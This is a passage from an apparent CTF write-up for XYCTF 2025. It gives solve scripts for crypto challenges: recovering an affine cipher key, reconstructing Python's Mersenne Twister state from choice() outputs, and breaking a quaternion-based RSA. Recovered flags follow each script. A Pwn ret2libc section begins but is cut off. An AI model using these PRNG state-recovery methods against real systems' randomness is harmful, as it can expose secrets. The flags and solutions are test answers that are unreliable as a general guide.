PRNG(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">flag=<span class="comment">&#x27;114&#x27;</span></span><br><span class="line"></span><br><span class="line">encc=enc[<span class="number">0</span>]-enc[<span class="number">2</span>]</span><br><span class="line">inv_e=inverse(table.index(<span class="comment">&#x27;1&#x27;)-table.index(&#x27;4&#x27;),19198111)</span></span><br><span class="line">print(inv_e)</span><br><span class="line"></span><br><span class="line">amod=(enc[<span class="number">0</span>]-enc[<span class="number">2</span>])*inv_e%<span class="number">19198111</span></span><br><span class="line">print(amod)</span><br><span class="line">inv_a=inverse(amod,<span class="number">19198111</span>)</span><br><span class="line">print(inv_a)</span><br><span class="line">b=enc[<span class="number">0</span>]-amod*table.index(<span class="comment">&#x27;1&#x27;)%19198111</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">    print(table[((i-b)*inv_a%<span class="number">19198111</span>)],<span class="keyword">end</span>=<span class="comment">&#x27;&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>114514fixedpointissodangerous1919810</p>
<h3 id="choice"><a href="#choice" class="headerlink" title="choice"></a>choice</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">b&#x27;XYCTF&#123;&#x27;</span>) <span class="keyword">and</span> flag.endswith(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line">flag = flag[<span class="number">6</span>:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">msg = bytes_to_long(flag)</span><br><span class="line">rand = Random()</span><br><span class="line">test = <span class="built_in">bytes</span>([i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>, -<span class="number">1</span>, -<span class="number">1</span>)])</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;output.py&#x27;</span>, <span class="string">&#x27;w&#x27;</span>).write(<span class="string">f&#x27;enc = <span class="subst">&#123;msg ^ rand.getrandbits(msg.bit_length())&#125;</span>\nr = <span class="subst">&#123;[rand.choice(test) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2496</span>)]&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>给了2496组choice()，查看源码发现和getrandbits(8)相当，根据索引构建矩阵求解即可复原state，使用extend_mt19937_predictor溯源即可</p>
<p>m长度可能与e有偏差，多试两位即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/mnt/e/wenjian/p/timu/xyCTF/2025/choice/output.py&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    e=<span class="built_in">int</span>(f.readline().split(<span class="string">&quot;=&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">    r=<span class="built_in">eval</span>(f.read().split(<span class="string">&quot;=&quot;</span>)[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">test = <span class="built_in">bytes</span>([i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>, -<span class="number">1</span>, -<span class="number">1</span>)])</span><br><span class="line"></span><br><span class="line">Dall=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> r:</span><br><span class="line">    Dall.append(test.index(i))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line"><span class="built_in">print</span>(Dall)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(Dall))</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">n=<span class="built_in">len</span>(Dall)</span><br><span class="line">D=Dall</span><br><span class="line">rng=Random()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getRows</span>(<span class="params">rng</span>):</span><br><span class="line">    <span class="comment">#这一部分根据题目实际编写，必须和题目实际比特获取顺序和方式完全一致，且确保比特数大于19937，并且请注意zfill。</span></span><br><span class="line">    row=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        row+=<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, (<span class="built_in">bin</span>(rng.getrandbits(<span class="number">32</span>)&gt;&gt;(<span class="number">32</span>-<span class="number">8</span>))[<span class="number">2</span>:].zfill(<span class="number">8</span>))))</span><br><span class="line">    <span class="keyword">return</span> row</span><br><span class="line">M=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">19968</span>):<span class="comment">#这一部分为固定套路，具体原因已经写在注释中了</span></span><br><span class="line"></span><br><span class="line">    state = [<span class="number">0</span>]*<span class="number">624</span></span><br><span class="line">    temp = <span class="string">&quot;0&quot;</span>*i + <span class="string">&quot;1&quot;</span>*<span class="number">1</span> + <span class="string">&quot;0&quot;</span>*(<span class="number">19968</span>-<span class="number">1</span>-i)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">        state[j] = <span class="built_in">int</span>(temp[<span class="number">32</span>*j:<span class="number">32</span>*j+<span class="number">32</span>],<span class="number">2</span>)</span><br><span class="line">    rng.setstate((<span class="number">3</span>,<span class="built_in">tuple</span>(state+[<span class="number">624</span>]),<span class="literal">None</span>)) <span class="comment">#这个setstate也是固定格式，已于2025.1.21测试</span></span><br><span class="line">    M.append(getRows(rng))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">M=Matrix(GF(<span class="number">2</span>),M)</span><br><span class="line"><span class="built_in">print</span>(M.rank())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">y=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    y+=<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, (<span class="built_in">bin</span>(D[i])[<span class="number">2</span>:].zfill(<span class="number">8</span>))))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(y))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;--------------------------------------------------------------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line">y=vector(GF(<span class="number">2</span>),y)</span><br><span class="line">s=M.solve_left(y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">G=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">    C=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        C&lt;&lt;=<span class="number">1</span></span><br><span class="line">        C|=<span class="built_in">int</span>(s[<span class="number">32</span>*i+j])</span><br><span class="line">    G.append(C)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">RNG1 = random.Random()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">    G[i]=<span class="built_in">int</span>(G[i])</span><br><span class="line"><span class="built_in">print</span>(G)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># G=[0, 490535307, 1496475985, 1304389653, 3073248862, 2386441930, 1822503478, 2020774719, 4023824107, 1480116190, 3595911337, 4199707216, 669968687, 826798707, 2615625545, 3915683430, 168325080, 829537011, 1165965885, 981460179, 2661311210, 316250339, 1045607037, 2688190930, 118171210, 3451453216, 3866477339, 2868202172, 1761379194, 1058828879, 1542168919, 2021772452, 2569206428, 2418006454, 3114112729, 1682301179, 3200486818, 599215990, 3404606484, 1911329240, 3444584517, 2269914870, 2733846467, 2801800027, 248142392, 1885498765, 860592907, 1802543044, 2381250266, 858114164, 2518994312, 962044368, 973015259, 3942118714, 3680009016, 2032313670, 3387751989, 1054484707, 2636564424, 1944206009, 2577425725, 1603497474, 392224733, 1859494210, 3997782846, 4192576547, 1107246885, 2404750701, 2157620568, 270457783, 2445196691, 3937008468, 3121127879, 2378519387, 425217735, 2564663584, 686095178, 2624185419, 3971886279, 2680818161, 2787863330, 2110546597, 687271821, 2277728162, 2803200905, 1049854254, 167450062, 3024645977, 3863615534, 423262694, 2034761849, 969338715, 1511630961, 2649226142, 366301301, 2130366793, 1560835738, 3571705620, 3487936619, 839414948, 1316270660, 568821823, 763054927, 2908961603, 1102984025, 3749009029, 449320085, 1308343884, 4157952695, 3187534659, 1580220597, 2173463099, 1595396219, 560342012, 3540854382, 370188528, 2936067839, 3845682323, 2060758533, 2636537833, 2045197349, 1945678739, 1987702201, 1386018091, 3389849161, 3658584265, 1063584606, 1609671890, 2147966037, 408763514, 173407274, 3026893195, 782093047, 612664728, 2008637303, 2231388523, 376518271, 2459748419, 2989539508, 1291508175, 739599924, 2787615130, 438993275, 3419636363, 396288162, 890864194, 2703944810, 2855282142, 3822277049, 2097517145, 3561662446, 3033564783, 1419618886, 1113476278, 1207289994, 51062508, 2200207646, 270434158, 3368286735, 1919259101, 2520477581, 3490526248, 575225377, 3390786656, 685824799, 2700369515, 1002309859, 71116734, 2055482703, 2658054435, 1094192336, 1947555707, 2442909426, 3499290994, 4054825654, 4162150808, 595324989, 2564147367, 2210623235, 3240656068, 2974526728, 1097736460, 3789121430, 990080517, 455497279, 591810412, 2723818619, 1828779877, 3360239376, 3698746341, 1962766646, 3891940910, 194869848, 3113141597, 4173680019, 2492879487, 1782458264, 2644873038, 3057000015, 1477560683, 260635038, 4014541913, 2475381256, 3432141583, 1449600258, 1806521550, 3993006180, 1144296388, 291996587, 2791231577, 2014376521, 3385338386, 3917594173, 4112262622, 3881010559, 1879348257, 4088686127, 943465051, 2717992292, 281219314, 829214474, 1429253889, 896560967, 4022504673, 1679700533, 4084224237, 3205942608, 3596088508, 2112079603, 3786503446, 2339855853, 358914192, 1821223774, 3764762766, 574390400, 230757101, 1681353616, 1404353461, 474457722, 818843357, 1916555525, 1478313262, 1376597702, 1725676847, 2410606224, 160362913, 165431882, 679714160, 578803644, 1251384768, 781503133, 252645721, 1216677581, 745854028, 4257762445, 232057782, 4131450922, 2243258111, 2680095923, 2131010707, 1945987666, 3649103696, 1306908197, 3923095658, 1586814958, 4275479481, 1792900040, 3513683706, 3043365645, 1598493028, 32483759, 212292997, 2484980536, 833036523, 446172640, 469599570, 1783543378, 34817764, 381132111, 1816020014, 3267362667, 223013760, 3717861858, 1981643591, 3438213528, 1159293740, 1087473027, 1845306386, 1597047436, 811182716, 4036992807, 866266593, 2817126195, 2583634769, 4227649879, 2672651673, 1158298570, 1147396726, 2938397432, 1542609148, 4196176929, 4064670511, 2395573335, 529637852, 4218916776, 2144528354, 1480788832, 1397451235, 1376724653, 2972863103, 3126088025, 1754053571, 61572923, 1962366418, 3209345005, 1135973797, 2282020151, 1617329326, 2165555451, 1335819294, 4274157719, 26224158, 836546160, 1863920790, 3735102502, 226852542, 621648448, 2125683057, 2719749744, 2624596686, 1627646676, 1476402803, 1157882819, 2139666545, 4224008503, 538777205, 160235477, 1389743733, 4255663843, 1232932267, 714165924, 3360017571, 3861531699, 1259644568, 1889531702, 3835320074, 962334880, 2655642856, 2626363498, 1891384806, 1801620109, 1897599626, 3687809766, 1522030816, 1513382903, 3712790758, 3610944389, 2016393056, 1006803814, 517272163, 2093521873, 3521116957, 365700165, 127017649, 1034144380, 383768854, 814208276, 794839368, 2538604191, 1941513101, 1342716317, 3555862634, 856481495, 2490707626, 3583375428, 2805836257, 245564123, 3108295323, 1565518856, 2649180690, 3332256362, 332138267, 2753126792, 1373150168, 3689890710, 223149061, 2451398005, 2044764250, 253027501, 3654914798, 3071035850, 4073951612, 690760932, 2576679227, 1899001759, 3179694571, 549833987, 3103159161, 2749555997, 3701137981, 103780406, 3880550485, 641014351, 614977565, 3252106272, 1500800921, 2346355748, 1437619729, 3713115526, 4169303983, 953535013, 722731441, 3485174363, 1123805551, 596536035, 1466804419, 3185872953, 2541958005, 909181586, 2235810910, 2325856501, 1907373845, 3395068733, 3727013849, 3129841537, 2209755148, 386103378, 959714264, 4059368152, 3171578698, 1935673297, 1334114851, 2000714717, 291544611, 2924507130, 1118846473, 834320931, 290128353, 758935454, 1295926016, 1596770824, 1977132939, 3804148806, 3591309623, 4209845635, 2998785209, 3353138216, 1739365771, 228727322, 2787865152, 4064361337, 3898185832, 628696008, 805010811, 2283970114, 261773773, 373115591, 2811158375, 2209330766, 476245752, 2727559206, 729386039, 3598648760, 227347764, 2772461981, 3927693335, 772797350, 1215579938, 1991587620, 1968980116, 213188572, 1455236565, 646373577, 3221190285, 2407608088, 388710597, 3068317471, 560173616, 2384843322, 2804823319, 3296469232, 4132838759, 1166039793, 1651089967, 1217559362, 1466724612, 3066497469, 2542065239, 1548132571, 2252598557, 1114227092, 315950281, 4260294426, 390016269, 237846157, 666128591, 4104218965, 4052610947, 2880940708, 679949465, 3265033554, 2618804058, 1983265063, 3934746131, 3851626972, 2695590210, 277341758, 2496522831, 2390301598, 1237676785, 541056536, 559487185, 878088736, 1654760693, 3091440937, 4184991854, 4277345620, 4128668672, 3475002233, 1191304304, 410233597, 1753481581, 522497440, 3490095733, 1740782454, 279075776, 4111542987, 1488482616, 2358022381, 2420694338, 4051823347, 2839869382, 700753851, 4187502580, 3609799609, 3816223830, 3465776160, 2643572446, 2117522904, 337820788, 4095876916, 4027724494, 3030168724, 2966453700, 750155676, 2187990790, 1012578929, 1502179669, 1028354250, 3886098849, 422175433, 1312545625, 3002465781, 1095759919, 364274776, 608451515, 539138648, 3725177121, 2681745835, 2060057886, 2467932655, 1328800475, 3777619753, 871763400, 3312924583, 2674204807, 4159118820, 3502457342, 3533526784, 2392773867, 3758459535, 313416918, 2746154645, 2040485405, 3212871698, 3744071701, 1518338816, 2076259952, 2344700130, 3755882401, 1001438918, 2331345786, 573931854, 371837673, 2890869138, 773771187, 2205676903, 1136370498, 1687795223, 3691084510, 2583108857, 1618641671, 1809021081, 3933440855, 2749174598, 530562158, 2653872255, 2070076429, 467552727, 577607036, 459715927, 1232385236, 495255405, 225866996, 3871108981, 565101302, 373456503, 1504979081, 761278333, 2227115284, 3700809837, 3597612966, 517375768, 108496019, 2916932837, 2100375706, 746007798, 216873417, 3182230215, 3523337342, 365334474, 612842567, 532858878, 3162228125]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">    G[i]=<span class="built_in">int</span>(G[i])</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">RNG1 = random.Random()</span><br><span class="line">RNG1.setstate((<span class="built_in">int</span>(<span class="number">3</span>),<span class="built_in">tuple</span>(G+[<span class="built_in">int</span>(<span class="number">624</span>)]),<span class="literal">None</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> extend_mt19937_predictor <span class="keyword">import</span> ExtendMT19937Predictor</span><br><span class="line"></span><br><span class="line">predictor = ExtendMT19937Predictor()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">    predictor.setrandbits(RNG1.getrandbits(<span class="number">32</span>), <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">    predictor.backtrack_getrandbits(<span class="number">32</span>)</span><br><span class="line">    </span><br><span class="line">key=predictor.backtrack_getrandbits(e.bit_length()+<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(e^^key))</span><br></pre></td></tr></table></figure>

<p><em><strong>0h_51mple_r@nd0m</strong></em></p>
<h3 id="复复复复数"><a href="#复复复复数" class="headerlink" title="复复复复数"></a>复复复复数</h3><p>四元数的逆元为其共轭数除以模长的平方，根据已知可以求得p，q，r</p>
<p>但是e有个因子3，但是m其实十分小，计算阶然后除以公因数即可直接解出</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ComComplex</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, value=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span>):</span><br><span class="line">        <span class="variable language_">self</span>.value = value</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        s = <span class="built_in">str</span>(<span class="variable language_">self</span>.value[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">for</span> k,i <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="variable language_">self</span>.value[<span class="number">1</span>:]):</span><br><span class="line">            <span class="keyword">if</span> i &gt;= <span class="number">0</span>:</span><br><span class="line">                s += <span class="string">&#x27;+&#x27;</span></span><br><span class="line">            s += <span class="built_in">str</span>(i) +<span class="string">&#x27;ijk&#x27;</span>[k]</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__add__</span>(<span class="params">self,x</span>):</span><br><span class="line">        <span class="keyword">return</span> ComComplex([i+j <span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">zip</span>(<span class="variable language_">self</span>.value,x.value)])</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__mul__</span>(<span class="params">self,x</span>):</span><br><span class="line">        a = <span class="variable language_">self</span>.value[<span class="number">0</span>]*x.value[<span class="number">0</span>]-<span class="variable language_">self</span>.value[<span class="number">1</span>]*x.value[<span class="number">1</span>]-<span class="variable language_">self</span>.value[<span class="number">2</span>]*x.value[<span class="number">2</span>]-<span class="variable language_">self</span>.value[<span class="number">3</span>]*x.value[<span class="number">3</span>]</span><br><span class="line">        b = <span class="variable language_">self</span>.value[<span class="number">0</span>]*x.value[<span class="number">1</span>]+<span class="variable language_">self</span>.value[<span class="number">1</span>]*x.value[<span class="number">0</span>]+<span class="variable language_">self</span>.value[<span class="number">2</span>]*x.value[<span class="number">3</span>]-<span class="variable language_">self</span>.value[<span class="number">3</span>]*x.value[<span class="number">2</span>]</span><br><span class="line">        c = <span class="variable language_">self</span>.value[<span class="number">0</span>]*x.value[<span class="number">2</span>]-<span class="variable language_">self</span>.value[<span class="number">1</span>]*x.value[<span class="number">3</span>]+<span class="variable language_">self</span>.value[<span class="number">2</span>]*x.value[<span class="number">0</span>]+<span class="variable language_">self</span>.value[<span class="number">3</span>]*x.value[<span class="number">1</span>]</span><br><span class="line">        d = <span class="variable language_">self</span>.value[<span class="number">0</span>]*x.value[<span class="number">3</span>]+<span class="variable language_">self</span>.value[<span class="number">1</span>]*x.value[<span class="number">2</span>]-<span class="variable language_">self</span>.value[<span class="number">2</span>]*x.value[<span class="number">1</span>]+<span class="variable language_">self</span>.value[<span class="number">3</span>]*x.value[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">return</span> ComComplex([a,b,c,d])</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__mod__</span>(<span class="params">self,x</span>):</span><br><span class="line">        <span class="keyword">return</span> ComComplex([i % x <span class="keyword">for</span> i <span class="keyword">in</span> <span class="variable language_">self</span>.value])</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__pow__</span>(<span class="params">self, x, n=<span class="literal">None</span></span>):</span><br><span class="line">        tmp = ComComplex(<span class="variable language_">self</span>.value)</span><br><span class="line">        a = ComComplex([<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">while</span> x:</span><br><span class="line">            <span class="keyword">if</span> x &amp; <span class="number">1</span>:</span><br><span class="line">                a *= tmp</span><br><span class="line">            tmp *= tmp</span><br><span class="line">            <span class="keyword">if</span> n:</span><br><span class="line">                a %= n</span><br><span class="line">                tmp %= n</span><br><span class="line">            x &gt;&gt;= <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inv</span>(<span class="params">l,mod</span>):</span><br><span class="line">        inv_len=inverse(<span class="built_in">sum</span>(i**<span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> l),mod)</span><br><span class="line">        <span class="keyword">return</span> ComComplex([l[<span class="number">0</span>]*inv_len%mod,-l[<span class="number">1</span>]*inv_len%mod,-l[<span class="number">2</span>]*inv_len%mod,-l[<span class="number">3</span>]*inv_len%mod])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">hints = [<span class="number">375413371936</span>,<span class="number">452903063925</span>,<span class="number">418564633198</span>,<span class="number">452841062207</span>]</span><br><span class="line">gift = [<span class="number">8123312244520119413231609191866976836916616973013918670932199631084038015924368317077919454611785179950870055560079987034735836668109705445946887481003729</span>,<span class="number">20508867471664499348708768798854433383217801696267611753941328714877299161068885700412171</span>,<span class="number">22802458968832151777449744120185122420871929971817937643641589637402679927558503881707868</span>,<span class="number">40224499597522456323122179021760594618350780974297095023316834212332206526399536884102863</span>]</span><br><span class="line">P = <span class="number">8123312244520119413231609191866976836916616973013918670932199631182724263362174895104545305364960781233690810077210539091362134310623408173268475389315109</span></span><br><span class="line">n = <span class="number">408713495380933615345467409596399184629824932933932227692519320046890365817329617301604051766392980053993030281090124694858194866782889226223493799859404283664530068697313752856923001112586828837146686963124061670340088332769524367</span></span><br><span class="line">c = ComComplex([<span class="number">212391106108596254648968182832931369624606731443797421732310126161911908195602305474921714075911012622738456373731638115041135121458776339519085497285769160263024788009541257401354037620169924991531279387552806754098200127027800103</span>,<span class="number">24398526281840329222660628769015610312084745844610670698920371305353888694519135578269023873988641161449924124665731242993290561874625654977013162008430854786349580090169988458393820787665342793716311005178101342140536536153873825</span>,<span class="number">45426319565874516841189981758358042952736832934179778483602503215353130229731883231784466068253520728052302138781204883495827539943655851877172681021818282251414044916889460602783324944030929987991059211909160860125047647337380125</span>,<span class="number">96704582331728201332157222706704482771142627223521415975953255983058954606417974983056516338287792260492498273014507582247155218239742778886055575426154960475637748339582574453542182586573424942835640846567809581805953259331957385</span>])</span><br><span class="line">e=<span class="number">65547</span></span><br><span class="line"></span><br><span class="line">inv=ComComplex.inv(hints,P)</span><br><span class="line">gifts=ComComplex(gift)</span><br><span class="line">keys=inv*gifts%P</span><br><span class="line"><span class="built_in">print</span>(keys)</span><br><span class="line"></span><br><span class="line">_,p,q,r=keys.value</span><br><span class="line"><span class="built_in">print</span>(p*q*r-n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(GCD(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r-<span class="number">1</span>)))</span><br><span class="line"><span class="built_in">print</span>(GCD(e,p-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(GCD(e,q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(GCD(e,r-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">d=inverse(e,(q**<span class="number">4</span>-q**<span class="number">3</span>-q**<span class="number">2</span>+q)//<span class="number">3</span>)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,q)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> m.value:</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(i).decode(),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>flag{Quaternion_15_ComComComComplexXXX!!!?}</p>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="Ret2libc’s-Revenge"><a href="#Ret2libc’s-Revenge" class="headerlink" title="Ret2libc’s Revenge"></a>Ret2libc’s Revenge</h3><p>溢出可以写负数来改返回地址，之后ret2libc就行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 